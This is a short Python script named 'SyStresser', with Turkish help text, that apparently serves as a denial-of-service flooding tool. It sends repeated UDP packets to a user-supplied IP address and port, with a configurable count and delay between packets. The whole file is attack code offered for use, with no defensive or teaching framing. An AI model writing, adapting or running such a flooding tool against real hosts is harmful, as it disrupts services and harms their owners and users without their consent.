import socket
import argparse
import time

def attack(ip, port, paket_sayisi, saniye):
    udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sayac = 0
    while True:
        udp.sendto(b"Packet", (ip, port))
        sayac += 1
        print("Gönderilen paket sayısı: ", sayac)
        if sayac == paket_sayisi:
            break
        time.sleep(saniye)
    udp.close()

parser = argparse.ArgumentParser(description="SyStresser")
parser.add_argument("-u", "--url", dest="ip", help="Hedef IP adresi")
parser.add_argument("-p", "--port", dest="port", type=int, help="Hedef port")
parser.add_argument("-n", "--number", dest="paket_sayisi", type=int, help="Gönderilecek paket sayısı")
parser.add_argument("-s", "--seconds", dest="saniye", type=int, help="Gönderim arasındaki süre (saniye)")

args = parser.parse_args()

attack(args.ip, args.port, args.paket_sayisi, args.saniye)
